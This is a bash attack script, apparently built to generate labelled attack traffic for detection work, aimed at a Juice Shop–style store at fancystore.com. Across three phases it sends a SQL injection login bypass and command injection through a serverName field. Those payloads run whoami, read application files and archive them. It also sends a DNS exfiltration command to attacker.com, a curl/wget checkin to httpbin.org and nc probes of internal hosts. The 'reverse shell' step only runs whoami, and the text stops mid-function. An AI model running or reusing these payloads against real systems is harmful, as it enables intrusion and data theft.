#!/bin/bash

# Advanced Three-Phase Attack Script
# Phase 1: Shell Acquisition -> Phase 2: C2 Communication -> Phase 3: Data Exfiltration

# Generate unique log file name at script start
LOG_TIMESTAMP=$(date +%s)
LOG_PID=$$
LOG_FILENAME="attack_${LOG_TIMESTAMP}_${LOG_PID}.log"

# Redirect all output to log file with unique name
# We'll use a temporary name first, then rename it later
exec > >(tee /logs/${LOG_FILENAME}) 2>&1

# Global variables
TARGET="http://fancystore.com"
PHASE=""
ATTACK_TYPE=""
C2_SERVER=""
EXFIL_METHOD=""
LATERAL_TARGETS=""
INTERVAL=5
ATTACK_FILE=""
START_LINE=""
END_LINE=""
ATTACK_CHAIN_ID=""
ATTACK_CHAIN_TYPE=""

# Color output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Log phase function
log_phase() {
    local phase="$1"
    local message="$2"
    local timestamp=$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)
    echo "{\"timestamp\":\"$timestamp\",\"phase\":\"$phase\",\"message\":\"$message\",\"container_ip\":\"$(hostname -i | awk '{print $1}')\"}" | tee -a "$LOG_FILE"
}

# Function to select random attack chain type
select_attack_chain_type() {
    local chain_types=(
        "APT_chain"           # Advanced Persistent Threat chain
        "ransomware_chain"    # Ransomware deployment chain
        "data_theft_chain"    # Data exfiltration focused chain
        "crypto_mining_chain" # Cryptocurrency mining chain
        "botnet_chain"        # Botnet recruitment chain
        "web_defacement_chain" # Website defacement chain
    )
    
    # Select random chain type
    local random_index=$((RANDOM % ${#chain_types[@]}))
    ATTACK_CHAIN_TYPE="${chain_types[$random_index]}"
    
    # Generate unique chain ID with type prefix
    local ts=$(date +%s)
    local container_id=$(hostname | cut -c1-8)
    ATTACK_CHAIN_ID="${ATTACK_CHAIN_TYPE}_${ts}_${container_id}_$$"
    
    echo "[*] Selected attack chain type: $ATTACK_CHAIN_TYPE"
    echo "[*] Generated chain ID: $ATTACK_CHAIN_ID"
}

# Function to generate standard attack headers for ground truth
get_attack_headers() {
    local attack_type="$1"
    local phase="$2"
    local chain_id="$3"
    local timestamp=$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)
    
    # Generate event ID for the entire attack chain (only on phase 1)
    if [[ "$phase" == "1" ]] || [[ -z "$ATTACK_EVENT_ID" ]]; then
        local ts=$(date +%s)
        local container_id=$(hostname | cut -c1-8)
        ATTACK_EVENT_ID="event_${ts}_${container_id}_$$"
    fi
    
    echo "-H \"User-Agent: Advanced-Attack-Tool/1.0 (Linux; Attacker-Bot)\" \
          -H \"X-Attack-Phase: $phase\" \
          -H \"X-Attack-Type: $attack_type\" \
          -H \"X-Attack-Chain-ID: $chain_id\" \
          -H \"X-Attack-Event-ID: $ATTACK_EVENT_ID\" \
          -H \"X-Payload-Category: advanced_attack\" \
          -H \"X-Traffic-Type: attack\" \
          -H \"X-Attack-ID: phase${phase}_${attack_type}\" \
          -H \"X-Forwarded-For: 192.168.1.100\" \
          -H \"X-Real-IP: 192.168.1.100\" \
          -H \"X-Attack-Timestamp: $timestamp\" \
          -H \"X-Attack-Source: attacker\""
}

# Function to parse attack payload files like the original attack.sh
parse_payload_file() {
    local file_path="$1"
    local start_line="$2"
    local end_line="$3"
    
    if [[ ! -f "$file_path" ]]; then
        echo "Payload file not found: $file_path"
        return 1
    fi
    
    # Parse file with format: method|endpoint|payload|expected_code|attack_chain_id|description
    local line_count=0
    while IFS='|' read -r method endpoint payload expected_code chain_id description; do
        # Skip comments and empty lines
        if [[ "$method" =~ ^#.*$ ]] || [[ -z "$method" ]]; then
            continue
        fi
        
        line_count=$((line_count + 1))
        
        # Check if line is in range
        if [[ "$start_line" != "all" ]] && [[ $line_count -lt $start_line ]]; then
            continue
        fi
        if [[ "$end_line" != "all" ]] && [[ $line_count -gt $end_line ]]; then
            break
        fi
        
        execute_payload_attack "$method" "$endpoint" "$payload" "$expected_code" "$chain_id" "$description"
        
        sleep "$INTERVAL"
    done < "$file_path"
}

# Function to execute lateral movement attacks
execute_lateral_movement_attack() {
    local method="$1"
    local endpoint="$2" 
    local payload="$3"
    local expected_code="$4"
    local chain_id="$5"
    local description="$6"
    
    echo "[*] ========================================"
    echo "[*] EXECUTING LATERAL MOVEMENT ATTACK"
    echo "[*] ========================================"
    echo "[*] Method: $method"
    echo "[*] Endpoint: $endpoint"
    echo "[*] Payload: $payload"
    echo "[*] Chain ID: $chain_id"
    echo "[*] Description: $description"
    echo "[*] Targets: $LATERAL_TARGETS"
    
    # Parse lateral targets
    IFS=',' read -ra TARGET_LIST <<< "$LATERAL_TARGETS"
    
    for target in "${TARGET_LIST[@]}"; do
        echo "[*] Attempting lateral movement to: $target"
        
        # Execute the lateral movement command
        local timestamp=$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)
        
        # For lateral movement, we'll use the payload as a command to execute
        local response=$(curl -s -w "%{http_code}" -X POST "$TARGET$endpoint" \
            -H "Content-Type: application/json" \
            -H "User-Agent: Advanced-Attack-Tool/1.0 (Linux; Attacker-Bot)" \
            -H "X-Attack-Phase: 4" \
            -H "X-Attack-Type: lateral_movement" \
            -H "X-Attack-Chain-ID: $chain_id" \
            -H "X-Attack-Event-ID: $ATTACK_EVENT_ID" \
            -H "X-Payload-Category: advanced_attack" \
            -H "X-Traffic-Type: attack" \
            -H "X-Attack-ID: phase4_lateral_movement" \
            -H "X-Forwarded-For: 192.168.1.100" \
            -H "X-Real-IP: 192.168.1.100" \
            -H "X-Attack-Timestamp: $timestamp" \
            -H "X-Attack-Source: attacker" \
            -d "$payload")
        
        local status_code="${response: -3}"
        local response_body="${response%???}"
        
        echo "[*] Response Status: $status_code"
        echo "[*] Response Body: $response_body"
        
        # Log the lateral movement attempt
        local timestamp=$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)
        echo "{\"timestamp\":\"$timestamp\",\"phase\":\"4\",\"attack_type\":\"lateral_movement\",\"target\":\"$target\",\"method\":\"$method\",\"payload\":\"$payload\",\"status_code\":\"$status_code\",\"chain_id\":\"$chain_id\",\"description\":\"$description\"}" | tee -a "$LOG_FILE"
        
        # Simulate network connection to target (for PCAP generation)
        simulate_lateral_connection "$target" "$payload"
        
        sleep 2  # Brief pause between targets
    done
    
    echo "[*] Lateral movement attack completed"
}

# Function to simulate network connections for lateral movement
simulate_lateral_connection() {
    local target="$1"
    local payload="$2"
    
    echo "[*] Simulating network connection to: $target"
    
    # Try different connection methods based on target
    case $target in
        "internal-server")
            # Simulate SSH connection
            echo "[*] Simulating SSH connection to internal-server:22"
            # Use netcat to simulate connection (if available)
            if command -v nc >/dev/null 2>&1; then
                echo "SSH connection simulation" | nc -w 1 internal-server 22 2>/dev/null || true
            fi
            ;;
        "database-server")
            # Simulate MySQL connection
            echo "[*] Simulating MySQL connection to database-server:3306"
            if command -v nc >/dev/null 2>&1; then
                echo "MySQL connection simulation" | nc -w 1 database-server 3306 2>/dev/null || true
            fi
            ;;
        *)
            echo "[*] Simulating generic connection to: $target"
            ;;
    esac
}

# Function to execute individual payload attacks
execute_payload_attack() {
    local method="$1"
    local endpoint="$2" 
    local payload="$3"
    local expected_code="$4"
    local chain_id="$5"
    
    # Special handling for lateral movement phase
    if [[ "$ATTACK_TYPE" == "lateral_movement" ]]; then
        execute_lateral_movement_attack "$method" "$endpoint" "$payload" "$expected_code" "$chain_id"
        return
    fi
    local description="$6"
    
    echo "[*] Executing: $description (Chain: $chain_id)"
    log_phase "$PHASE" "Executing payload: $description (Chain: $chain_id)"
    
    # Generate headers for this request
    local timestamp=$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)
    
    # Generate event ID for the entire attack chain (only on phase 1)
    if [[ "$PHASE" == "1" ]] || [[ -z "$ATTACK_EVENT_ID" ]]; then
        local ts=$(date +%s)
        local container_id=$(hostname | cut -c1-8)
        ATTACK_EVENT_ID="event_${ts}_${container_id}_$$"
    fi
    
    local response
    if [[ "$method" == "POST" ]]; then
        response=$(curl -s -w "%{http_code}" \
            -X POST \
            -H "Content-Type: application/json" \
            -H "User-Agent: Advanced-Attack-Tool/1.0 (Linux; Attacker-Bot)" \
            -H "X-Attack-Phase: $PHASE" \
            -H "X-Attack-Type: $ATTACK_TYPE" \
            -H "X-Attack-Chain-ID: $chain_id" \
            -H "X-Attack-Event-ID: $ATTACK_EVENT_ID" \
            -H "X-Payload-Category: advanced_attack" \
            -H "X-Traffic-Type: attack" \
            -H "X-Attack-ID: phase${PHASE}_${ATTACK_TYPE}" \
            -H "X-Forwarded-For: 192.168.1.100" \
            -H "X-Real-IP: 192.168.1.100" \
            -H "X-Attack-Timestamp: $timestamp" \
            -H "X-Attack-Source: attacker" \
            -d "$payload" \
            --max-time 10 \
            "$TARGET$endpoint")
    else
        response=$(curl -s -w "%{http_code}" \
            -X GET \
            -H "User-Agent: Advanced-Attack-Tool/1.0 (Linux; Attacker-Bot)" \
            -H "X-Attack-Phase: $PHASE" \
            -H "X-Attack-Type: $ATTACK_TYPE" \
            -H "X-Attack-Chain-ID: $chain_id" \
            -H "X-Attack-Event-ID: $ATTACK_EVENT_ID" \
            -H "X-Payload-Category: advanced_attack" \
            -H "X-Traffic-Type: attack" \
            -H "X-Attack-ID: phase${PHASE}_${ATTACK_TYPE}" \
            -H "X-Forwarded-For: 192.168.1.100" \
            -H "X-Real-IP: 192.168.1.100" \
            -H "X-Attack-Timestamp: $timestamp" \
            -H "X-Attack-Source: attacker" \
            --max-time 10 \
            "$TARGET$endpoint")
    fi
    
    local http_code=$(echo "$response" | tail -c 4)
    
    if [[ "$http_code" == "$expected_code" ]] || [[ "$expected_code" == "*" ]]; then
        echo -e "${GREEN}[✓] Success: $description (Chain: $chain_id, Code: $http_code)${NC}"
        log_phase "$PHASE" "Payload success: $description (Chain: $chain_id, Code: $http_code)"
        return 0
    else
        echo -e "${RED}[✗] Failed: $description (Chain: $chain_id, Expected: $expected_code, Got: $http_code)${NC}"
        log_phase "$PHASE" "Payload failed: $description (Chain: $chain_id, Expected: $expected_code, Got: $http_code)"
        return 1
    fi
}

# Phase 1: Shell Acquisition
phase1_shell_acquisition() {
    log_phase "1" "Starting Phase 1: Shell Acquisition"
    
    echo -e "${BLUE}[Phase 1] Attempting to acquire shell access...${NC}"
    
    # If attack file is provided, use payload-based attacks
    if [[ -n "$ATTACK_FILE" ]] && [[ -f "$ATTACK_FILE" ]]; then
        echo "[*] Using payload file for Phase 1: $ATTACK_FILE"
        ATTACK_TYPE="shell_acquisition"
        parse_payload_file "$ATTACK_FILE" "$START_LINE" "$END_LINE"
        return $?
    fi
    
    # Default single attack if no payload file
    echo "[*] Using default shell acquisition attack"
    # 1.1 Command injection attack
    log_phase "1" "Attempting command injection attack"
    
    # test sql injection
    cmd_payload='{"email":"admin@juice-sh.op'\'' OR 1=1--","password":"test"}'
    
    # Generate event ID for the entire attack chain (only on phase 1)
    if [[ -z "$ATTACK_EVENT_ID" ]]; then
        local ts=$(date +%s)
        local container_id=$(hostname | cut -c1-8)
        ATTACK_EVENT_ID="event_${ts}_${container_id}_$$"
    fi
    
    response=$(curl -s -w "%{http_code}" \
        -X POST \
        -H "Content-Type: application/json" \
        -H "User-Agent: Advanced-Attack-Tool/1.0 (Linux; Attacker-Bot)" \
        -H "X-Attack-Phase: 1" \
        -H "X-Attack-Type: sql_injection" \
        -H "X-Attack-Chain-ID: $ATTACK_CHAIN_ID" \
        -H "X-Attack-Event-ID: $ATTACK_EVENT_ID" \
        -H "X-Payload-Category: advanced_attack" \
        -H "X-Traffic-Type: attack" \
        -H "X-Attack-ID: phase1_sql_injection" \
        -H "X-Forwarded-For: 192.168.1.100" \
        -H "X-Real-IP: 192.168.1.100" \
        -H "X-Attack-Timestamp: $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)" \
        -H "X-Attack-Source: attacker" \
        -d "$cmd_payload" \
        --max-time 10 \
        "$TARGET/rest/user/login")
    
    http_code=$(echo "$response" | tail -c 4)
    
    if [ "$http_code" = "200" ] || [ "$http_code" = "401" ]; then
        log_phase "1" "SQL injection attack successful, HTTP status code: $http_code"
        echo -e "${GREEN}[stage1] ✓ SQL injection attack successful!${NC}"
        
        # 1.2 reverse shell
        log_phase "1" "Attempting reverse shell"
        
        # collect system info
        shell_payload='{"serverName":"test; whoami > /tmp/user_info && id >> /tmp/user_info && echo \"shell_established\" > /tmp/shell_status"}'
        shell_response=$(curl -s -w "%{http_code}" \
            -X POST \
            -H "Content-Type: application/json" \
            -H "User-Agent: Advanced-Attack-Tool/1.0 (Linux; Attacker-Bot)" \
            -H "X-Attack-Phase: 1" \
            -H "X-Attack-Type: reverse_shell" \
            -H "X-Attack-Chain-ID: $ATTACK_CHAIN_ID" \
            -H "X-Attack-Event-ID: $ATTACK_EVENT_ID" \
            -H "X-Payload-Category: advanced_attack" \
            -H "X-Traffic-Type: attack" \
            -H "X-Attack-ID: phase1_reverse_shell" \
            -H "X-Forwarded-For: 192.168.1.100" \
            -H "X-Real-IP: 192.168.1.100" \
            -H "X-Attack-Timestamp: $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)" \
            -H "X-Attack-Source: attacker" \
            -d "$shell_payload" \
            --max-time 10 \
            "$TARGET/rest/admin/application-configuration")
        
        shell_code=$(echo "$shell_response" | tail -c 4)
        
        if [ "$shell_code" = "500" ]; then
            log_phase "1" "Reverse shell established successfully"
            echo -e "${GREEN}[stage1] ✓ Shell access acquired!${NC}"
            
            # create shell status file as success flag
            echo "shell_acquired_$(date +%s)" > /tmp/phase1_success
            return 0
        else
            log_phase "1" "Reverse shell establishment failed, HTTP status code: $shell_code"
        fi
    else
        log_phase "1" "Command injection failed, HTTP status code: $http_code"
    fi
    
    echo -e "${RED}[stage1] ✗ Shell access failed${NC}"
    return 1
}

# Phase 2: C2 Communication
phase2_c2_communication() {
    log_phase "2" "Starting Phase 2: C2 Communication"
    
    # Check if Phase 1 was successful
    if [ ! -f "/tmp/phase1_success" ]; then
        echo -e "${YELLOW}[Phase 2] Warning: Phase 1 not completed, continuing with C2 communication${NC}"
    fi
    
    echo -e "${BLUE}[Phase 2] Establishing C2 communication...${NC}"
    
    # If attack file is provided, use payload-based attacks
    if [[ -n "$ATTACK_FILE" ]] && [[ -f "$ATTACK_FILE" ]]; then
        echo "[*] Using payload file for Phase 2: $ATTACK_FILE"
        ATTACK_TYPE="c2_communication"
        parse_payload_file "$ATTACK_FILE" "$START_LINE" "$END_LINE"
        return $?
    fi
    
    # Default single attack if no payload file
    echo "[*] Using default C2 communication attack"
    
    # 2.1 test c2 server connectivity
    log_phase "2" "Testing C2 server connectivity"
    
    if [ -n "$C2_SERVER" ]; then
        # try to connect to local c2 server (same container)
        # start simple http server as c2
        python3 -m http.server 8080 --directory /tmp &
        C2_PID=$!
        sleep 2
        
        c2_test=$(curl -s -w "%{http_code}" \
            -H "User-Agent: Advanced-Attack-Tool/1.0 (Linux; Attacker-Bot)" \
            -H "X-Attack-Phase: 2" \
            -H "X-Attack-Type: c2_communication" \
            -H "X-Attack-Chain-ID: $ATTACK_CHAIN_ID" \
            -H "X-Attack-Event-ID: $ATTACK_EVENT_ID" \
            -H "X-Payload-Category: advanced_attack" \
            -H "X-Traffic-Type: attack" \
            -H "X-Attack-ID: phase2_c2_communication" \
            -H "X-Forwarded-For: 192.168.1.100" \
            -H "X-Real-IP: 192.168.1.100" \
            -H "X-Attack-Timestamp: $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)" \
            -H "X-Attack-Source: attacker" \
            --max-time 5 \
            "http://localhost:8080" 2>/dev/null || echo "000")
        
        if [ "$c2_test" != "000" ]; then
            log_phase "2" "C2 server connected successfully"
            echo -e "${GREEN}[stage2] ✓ C2 server connected${NC}"
            
            # 2.2 register to c2 server
            victim_id="victim_$(hostname)_$(date +%s)"
            register_payload="{\"victim_id\":\"$victim_id\",\"target\":\"$TARGET\",\"capabilities\":[\"command_exec\",\"file_read\"]}"
            
            # simulate c2 registration (write to local file)
            echo "$register_payload" > /tmp/c2_register.json
            register_response="200"
            
            register_code=$(echo "$register_response" | tail -c 4)
            
            if [ "$register_code" = "200" ]; then
                log_phase "2" "C2 registration successful, victim ID: $victim_id"
                echo -e "${GREEN}[stage2] ✓ C2 communication established!${NC}"
                
                # 2.3 heartbeat communication
                log_phase "2" "Starting heartbeat communication"
                
                for i in {1..3}; do
                    heartbeat_payload="{\"victim_id\":\"$victim_id\",\"status\":\"active\",\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)\"}"
                    
                    # simulate heartbeat communication (write to local file)
                    echo "$heartbeat_payload" >> /tmp/c2_heartbeat.log
                    heartbeat_code="200"
                    
                    if [ "$heartbeat_code" = "200" ]; then
                        log_phase "2" "Heartbeat communication successful ($i/3)"
                        echo -e "${GREEN}[stage2] ✓ Heartbeat $i/3 successful${NC}"
                    fi
                    
                    sleep 5
                done
                
                echo "$victim_id" > /tmp/phase2_success
                return 0
            else
                log_phase "2" "C2 registration failed, HTTP status code: $register_code"
            fi
        fi
    fi
    
    # 2.4 fallback: use basic tools to simulate c2 communication
    log_phase "2" "Using basic tools to simulate c2 communication"
    echo -e "${YELLOW}[stage2] Using fallback method to establish C2 communication${NC}"
    
    # use curl to simulate simple c2 communication
    c2_sim_payload='{"serverName":"test; curl -X POST -d \"victim_checkin\" http://httpbin.org/post || wget -O- --post-data=\"victim_checkin\" http://httpbin.org/post"}'
    
    c2_sim_response=$(curl -s -w "%{http_code}" \
        -X POST \
        -H "Content-Type: application/json" \
        -H "User-Agent: Advanced-Attack-Tool/1.0 (Linux; Attacker-Bot)" \
        -H "X-Attack-Phase: 2" \
        -H "X-Attack-Type: c2_simulation" \
        -H "X-Attack-Chain-ID: $ATTACK_CHAIN_ID" \
        -H "X-Attack-Event-ID: $ATTACK_EVENT_ID" \
        -H "X-Payload-Category: advanced_attack" \
        -H "X-Traffic-Type: attack" \
        -H "X-Attack-ID: phase2_c2_simulation" \
        -H "X-Forwarded-For: 192.168.1.100" \
        -H "X-Real-IP: 192.168.1.100" \
        -H "X-Attack-Timestamp: $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)" \
        -H "X-Attack-Source: attacker" \
        -d "$c2_sim_payload" \
        --max-time 15 \
        "$TARGET/rest/admin/application-configuration")
    
    c2_sim_code=$(echo "$c2_sim_response" | tail -c 4)
    
    if [ "$c2_sim_code" = "500" ]; then
        log_phase "2" "C2 communication simulation successful"
        echo -e "${GREEN}[stage2] ✓ C2 communication (simulation) established successfully!${NC}"
        echo "c2_established_$(date +%s)" > /tmp/phase2_success
        return 0
    fi
    
    echo -e "${RED}[stage2] ✗ C2 communication establishment failed${NC}"
    return 1
}

# Phase 3: Data Exfiltration
phase3_data_exfiltration() {
    log_phase "3" "Starting Phase 3: Data Exfiltration"
    
    # Check previous phases
    if [ ! -f "/tmp/phase1_success" ] && [ ! -f "/tmp/phase2_success" ]; then
        echo -e "${YELLOW}[Phase 3] Warning: Previous phases not completed, continuing with data exfiltration${NC}"
    fi
    
    echo -e "${BLUE}[Phase 3] Performing data exfiltration...${NC}"
    
    # If attack file is provided, use payload-based attacks
    if [[ -n "$ATTACK_FILE" ]] && [[ -f "$ATTACK_FILE" ]]; then
        echo "[*] Using payload file for Phase 3: $ATTACK_FILE"
        ATTACK_TYPE="data_exfiltration"
        parse_payload_file "$ATTACK_FILE" "$START_LINE" "$END_LINE"
        return $?
    fi
    
    # Default single attack if no payload file
    echo "[*] Using default data exfiltration attack"
    
    # 3.1 read target file information
    log_phase "3" "Starting to read target file information"
    
    # collect sensitive data through api
    echo "Starting to collect sensitive data through API..." 
    
    # collect user information
    curl -s -H "User-Agent: Advanced-Attack-Tool/1.0 (Linux; Attacker-Bot)" \
        -H "X-Attack-Phase: 3" \
        -H "X-Attack-Type: file_discovery" \
        -H "X-Attack-Chain-ID: $ATTACK_CHAIN_ID" \
        -H "X-Attack-Event-ID: $ATTACK_EVENT_ID" \
        -H "X-Payload-Category: advanced_attack" \
        -H "X-Traffic-Type: attack" \
        -H "X-Attack-ID: phase3_file_discovery" \
        -H "X-Forwarded-For: 192.168.1.100" \
        -H "X-Real-IP: 192.168.1.100" \
        -H "X-Attack-Timestamp: $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)" \
        -H "X-Attack-Source: attacker" \
        "$TARGET/rest/user/authentication-details" > /tmp/user_details.json 2>/dev/null || true
    
    # collect product information  
    curl -s -H "User-Agent: Advanced-Attack-Tool/1.0 (Linux; Attacker-Bot)" \
        -H "X-Attack-Phase: 3" \
        -H "X-Attack-Type: data_collection" \
        -H "X-Attack-Chain-ID: $ATTACK_CHAIN_ID" \
        -H "X-Attack-Event-ID: $ATTACK_EVENT_ID" \
        -H "X-Payload-Category: advanced_attack" \
        -H "X-Traffic-Type: attack" \
        -H "X-Attack-ID: phase3_data_collection" \
        -H "X-Forwarded-For: 192.168.1.100" \
        -H "X-Real-IP: 192.168.1.100" \
        -H "X-Attack-Timestamp: $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)" \
        -H "X-Attack-Source: attacker" \
        "$TARGET/api/Products" > /tmp/products_data.json 2>/dev/null || true
    
    # collect application configuration
    curl -s -H "User-Agent: Advanced-Attack-Tool/1.0 (Linux; Attacker-Bot)" \
        -H "X-Attack-Phase: 3" \
        -H "X-Attack-Type: config_read" \
        -H "X-Attack-Chain-ID: $ATTACK_CHAIN_ID" \
        -H "X-Attack-Event-ID: $ATTACK_EVENT_ID" \
        -H "X-Payload-Category: advanced_attack" \
        -H "X-Traffic-Type: attack" \
        -H "X-Attack-ID: phase3_config_read" \
        -H "X-Forwarded-For: 192.168.1.100" \
        -H "X-Real-IP: 192.168.1.100" \
        -H "X-Attack-Timestamp: $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)" \
        -H "X-Attack-Source: attacker" \
        "$TARGET/rest/admin/application-configuration" > /tmp/app_config.json 2>/dev/null || true
    
    # simulate command execution to collect system information
    echo "$(date): system information collection" > /tmp/system_info.txt
    echo "container ID: $(hostname)" >> /tmp/system_info.txt
    echo "process information: $(ps aux | head -5)" >> /tmp/system_info.txt
    
    file_discovery_payload='{"email":"test","password":"test"}'
    
            discovery_response=$(curl -s -w "%{http_code}" \
        -X POST \
        -H "Content-Type: application/json" \
        -H "User-Agent: Advanced-Attack-Tool/1.0 (Linux; Attacker-Bot)" \
        -H "X-Attack-Phase: 3" \
        -H "X-Attack-Type: file_discovery" \
        -H "X-Attack-Chain-ID: $ATTACK_CHAIN_ID" \
        -H "X-Attack-Event-ID: $ATTACK_EVENT_ID" \
        -H "X-Payload-Category: advanced_attack" \
        -H "X-Traffic-Type: attack" \
        -H "X-Attack-ID: phase3_file_discovery" \
        -H "X-Forwarded-For: 192.168.1.100" \
        -H "X-Real-IP: 192.168.1.100" \
        -H "X-Attack-Timestamp: $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)" \
        -H "X-Attack-Source: attacker" \
        -d "$file_discovery_payload" \
        --max-time 10 \
        "$TARGET/rest/user/login")
    
    discovery_code=$(echo "$discovery_response" | tail -c 4)
    
    if [ "$discovery_code" = "401" ] || [ "$discovery_code" = "200" ]; then
        log_phase "3" "File discovery successful"
        echo -e "${GREEN}[stage3] ✓ File discovery successful${NC}"
        
        # 3.2 read sensitive configuration file and data
        log_phase "3" "Starting to read sensitive configuration file and data"
        
        config_read_payload='{"serverName":"test; cat /app/package.json > /tmp/juice_shop_config.json 2>/dev/null && cat /app/build/routes/*.js > /tmp/routes_info.txt 2>/dev/null && ps aux > /tmp/running_processes.txt"}'
        
        config_response=$(curl -s -w "%{http_code}" \
            -X POST \
            -H "Content-Type: application/json" \
            -H "User-Agent: Advanced-Attack-Tool/1.0 (Linux; Attacker-Bot)" \
            -H "X-Attack-Phase: 3" \
            -H "X-Attack-Type: config_read" \
            -H "X-Attack-Chain-ID: $ATTACK_CHAIN_ID" \
            -H "X-Attack-Event-ID: $ATTACK_EVENT_ID" \
            -H "X-Payload-Category: advanced_attack" \
            -H "X-Traffic-Type: attack" \
            -H "X-Attack-ID: phase3_config_read" \
            -H "X-Forwarded-For: 192.168.1.100" \
            -H "X-Real-IP: 192.168.1.100" \
            -H "X-Attack-Timestamp: $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)" \
            -H "X-Attack-Source: attacker" \
            -d "$config_read_payload" \
            --max-time 10 \
            "$TARGET/rest/admin/application-configuration")
        
        config_code=$(echo "$config_response" | tail -c 4)
        
        if [ "$config_code" = "500" ]; then
            log_phase "3" "Configuration file read successfully"
            echo -e "${GREEN}[stage3] ✓ Configuration file read successfully${NC}"
            
            # 3.3 data exfiltration
            log_phase "3" "Starting data exfiltration"
            
            case "$EXFIL_METHOD" in
                "http")
                    # HTTP way to exfiltrate real sensitive data
                    log_phase "3" "Using HTTP way to exfiltrate sensitive data"
                    
                    # exfiltrate real collected sensitive data
        echo "Starting to exfiltrate collected sensitive data..."
        
        # create a compressed package containing all sensitive data
        tar czf "/tmp/complete_exfiltration_$(date +%s).tar.gz" \
            /tmp/user_details.json \
            /tmp/products_data.json \
            /tmp/app_config.json \
            /tmp/system_info.txt \
            /tmp/juice_shop_config.json \
            /tmp/running_processes.txt 2>/dev/null || true
            
        # copy to shared data directory
        cp /tmp/complete_exfiltration_*.tar.gz /shared_data/ 2>/dev/null || true
        
        exfil_payload='{"email":"exfiltration_test","password":"test"}'
                    
                    exfil_response=$(curl -s -w "%{http_code}" \
                        -X POST \
                        -H "Content-Type: application/json" \
                        -H "User-Agent: Advanced-Attack-Tool/1.0 (Linux; Attacker-Bot)" \
                        -H "X-Attack-Phase: 3" \
                        -H "X-Attack-Type: file_exfiltration" \
                        -H "X-Attack-Chain-ID: $ATTACK_CHAIN_ID" \
                        -H "X-Attack-Event-ID: $ATTACK_EVENT_ID" \
                        -H "X-Payload-Category: advanced_attack" \
                        -H "X-Traffic-Type: attack" \
                        -H "X-Attack-ID: phase3_file_exfiltration" \
                        -H "X-Forwarded-For: 192.168.1.100" \
                        -H "X-Real-IP: 192.168.1.100" \
                        -H "X-Attack-Timestamp: $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)" \
                        -H "X-Attack-Source: attacker" \
                        -d "$exfil_payload" \
                        --max-time 15 \
                        "$TARGET/rest/admin/application-configuration")
                    
                    exfil_code=$(echo "$exfil_response" | tail -c 4)
                    ;;
                    
                "dns")
                    # DNS way to exfiltrate data (simulate)
                    log_phase "3" "Using DNS way to exfiltrate data"
                    
                    dns_exfil_payload='{"serverName":"test; nslookup $(echo \"data_exfil\" | base64).attacker.com || echo \"dns_exfil_attempted\""}'
                    
                    exfil_response=$(curl -s -w "%{http_code}" \
                        -X POST \
                        -H "Content-Type: application/json" \
                        -H "User-Agent: Advanced-Attack-Tool/1.0 (Linux; Attacker-Bot)" \
                        -H "X-Attack-Phase: 3" \
                        -H "X-Attack-Type: dns_exfiltration" \
                        -H "X-Attack-Chain-ID: $ATTACK_CHAIN_ID" \
                        -H "X-Attack-Event-ID: $ATTACK_EVENT_ID" \
                        -H "X-Payload-Category: advanced_attack" \
                        -H "X-Traffic-Type: attack" \
                        -H "X-Attack-ID: phase3_dns_exfiltration" \
                        -H "X-Forwarded-For: 192.168.1.100" \
                        -H "X-Real-IP: 192.168.1.100" \
                        -H "X-Attack-Timestamp: $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)" \
                        -H "X-Attack-Source: attacker" \
                        -d "$dns_exfil_payload" \
                        --max-time 10 \
                        "$TARGET/rest/admin/application-configuration")
                    
                    exfil_code=$(echo "$exfil_response" | tail -c 4)
                    ;;
                    
                *)
                    # default way to exfiltrate real data
                    log_phase "3" "Using file system to exfiltrate real sensitive data"
                    
                    file_exfil_payload='{"serverName":"test; tar czf /shared_data/complete_exfiltration_$(date +%s).tar.gz /tmp/juice_shop_config.json /tmp/system_users.txt /tmp/environment_vars.txt /tmp/app_configs.txt /tmp/user_info /tmp/running_processes.txt 2>/dev/null && echo \"real_data_exfiltrated_$(date +%s)\" > /tmp/exfil_status"}'
                    
                    exfil_response=$(curl -s -w "%{http_code}" \
                        -X POST \
                        -H "Content-Type: application/json" \
                        -H "User-Agent: Advanced-Attack-Tool/1.0 (Linux; Attacker-Bot)" \
                        -H "X-Attack-Phase: 3" \
                        -H "X-Attack-Type: file_exfiltration" \
                        -H "X-Attack-Chain-ID: $ATTACK_CHAIN_ID" \
                        -H "X-Attack-Event-ID: $ATTACK_EVENT_ID" \
                        -H "X-Payload-Category: advanced_attack" \
                        -H "X-Traffic-Type: attack" \
                        -H "X-Attack-ID: phase3_file_exfiltration" \
                        -H "X-Forwarded-For: 192.168.1.100" \
                        -H "X-Real-IP: 192.168.1.100" \
                        -H "X-Attack-Timestamp: $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)" \
                        -H "X-Attack-Source: attacker" \
                        -d "$file_exfil_payload" \
                        --max-time 10 \
                        "$TARGET/rest/admin/application-configuration")
                    
                    exfil_code=$(echo "$exfil_response" | tail -c 4)
                    ;;
            esac
            
            if [ "$exfil_code" = "500" ]; then
                log_phase "3" "Data exfiltration successful"
                echo -e "${GREEN}[stage3] ✓ Data exfiltration successful!${NC}"
                echo "exfiltration_completed_$(date +%s)" > /tmp/phase3_success
                return 0
            else
                log_phase "3" "Data exfiltration failed, HTTP status code: $exfil_code"
            fi
        else
            log_phase "3" "Configuration file read failed, HTTP status code: $config_code"
        fi
    else
        log_phase "3" "File discovery failed, HTTP status code: $discovery_code"
    fi
    
    echo -e "${RED}[stage3] ✗ Data exfiltration failed${NC}"
    return 1
}

# main execution function
execute_advanced_attack() {
    # Select attack chain type at the beginning
    select_attack_chain_type
    
